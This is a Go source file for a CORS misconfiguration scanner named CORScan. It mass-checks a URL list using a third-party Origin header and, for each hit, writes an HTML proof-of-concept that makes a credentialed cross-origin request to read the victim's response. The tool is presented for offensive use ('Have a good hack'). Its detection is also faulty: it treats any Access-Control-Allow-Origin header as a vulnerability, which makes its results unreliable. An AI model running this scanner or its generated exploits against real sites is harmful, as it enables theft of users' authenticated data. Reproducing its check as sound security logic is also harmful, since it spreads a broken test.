package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
	"flag"
)

const (
	colorRed    = "\033[91m"
	colorGreen  = "\033[92m"
	colorBlue   = "\033[94m"
	colorPurple = "\033[95m"
	colorReset  = "\033[0m"
)

const banner = `
   __________  ____  _____                
  / ____/ __ \/ __ \/ ___/_________ _____ 
 / /   / / / / /_/ /\__ \/ ___/ __ '/ __ \
/ /___/ /_/ / _, _/___/ / /__/ /_/ / / / /
\____/\____/_/ |_|/____/\___/\__,_/_/ /_/ 
                                          
      ╔═════════════════════════╗
      ║ Tool Created by Baldwin  ║
      ║ Version 2.0 (Go)        ║
      ╚═════════════════════════╝
`

const pocTemplate = `<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
             xhr.open("GET", "%s", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>`

type Result struct {
	URL       string
	Vulnerable bool
	Error     error
}

func checkCORS(url string, results chan<- Result) {
	if !strings.HasPrefix(url, "http") {
		url = "http://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		results <- Result{URL: url, Vulnerable: false, Error: err}
		return
	}

	req.Header.Set("Origin", "cors.mrempy.com")
	
	resp, err := client.Do(req)
	if err != nil {
		results <- Result{URL: url, Vulnerable: false, Error: err}
		return
	}
	defer resp.Body.Close()

	_, hasHeader := resp.Header["Access-Control-Allow-Origin"]
	results <- Result{URL: url, Vulnerable: hasHeader, Error: nil}
}

func createPoCFile(url, outputDir string) error {
	if err := os.MkdirAll(filepath.Join(outputDir, "poc"), 0755); err != nil {
		return err
	}

	filename := strings.ReplaceAll(strings.TrimPrefix(strings.TrimPrefix(url, "http://"), "https://"), "/", "-")
	pocPath := filepath.Join(outputDir, "poc", filename+".html")
	
	poc := fmt.Sprintf(pocTemplate, url)
	return ioutil.WriteFile(pocPath, []byte(poc), 0644)
}

func main() {
	fmt.Print(colorPurple, banner, colorReset)

	// Define flags
	urlFile := flag.String("l", "", "URL list file")
	outputFile := flag.String("o", "", "Output file")
	flag.Parse()

	// Check if URL file is provided
	if *urlFile == "" {
		fmt.Printf("%sError: URL list file is required (-l flag)%s\n", colorRed, colorReset)
		fmt.Println("Usage: corsy -l urls.txt [-o output.txt]")
		return
	}

	// Set default output directory
	outputDir := "output"
	if *outputFile != "" {
		outputDir = filepath.Dir(*outputFile)
	}

	// Create output directory if it doesn't exist
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		fmt.Printf("%sError creating output directory: %v%s\n", colorRed, err, colorReset)
		return
	}

	// Open URL list file
	file, err := os.Open(*urlFile)
	if err != nil {
		fmt.Printf("%sError opening file: %v%s\n", colorRed, err, colorReset)
		return
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	results := make(chan Result, len(urls))
	var wg sync.WaitGroup

	for _, url := range urls {
		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			checkCORS(u, results)
		}(url)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	vulnCount := 0
	for result := range results {
		if result.Error != nil {
			fmt.Printf("%s[-] Error checking %s: %v%s\n", colorRed, result.URL, result.Error, colorReset)
			continue
		}

		if result.Vulnerable {
			vulnCount++
			fmt.Printf("%s[+] CORS Vuln: %s%s\n", colorGreen, result.URL, colorReset)
			
			if err := createPoCFile(result.URL, outputDir); err != nil {
				fmt.Printf("%sError creating PoC: %v%s\n", colorRed, err, colorReset)
			} else {
				fmt.Printf("%s └─> PoC created in %s/poc/%s\n", colorGreen, outputDir, colorReset)
			}
		} else {
			fmt.Printf("%s[-] %s%s\n", colorRed, result.URL, colorReset)
		}
	}

	// If output file is specified, write results to it
	if *outputFile != "" {
		var results strings.Builder
		results.WriteString("CORS Vulnerability Scan Results\n")
		results.WriteString("============================\n\n")
		results.WriteString(fmt.Sprintf("Total vulnerable endpoints found: %d\n\n", vulnCount))
		
		// Create or truncate output file
		f, err := os.Create(*outputFile)
		if err != nil {
			fmt.Printf("%sError creating output file: %v%s\n", colorRed, err, colorReset)
		} else {
			defer f.Close()
			f.WriteString(results.String())
			fmt.Printf("%sResults have been saved to: %s%s\n", colorGreen, *outputFile, colorReset)
		}
	}

	fmt.Printf("%s[*] Job done. Found %d vulnerable endpoints. Have a good hack ;)%s\n", 
		colorBlue, vulnCount, colorReset)
} 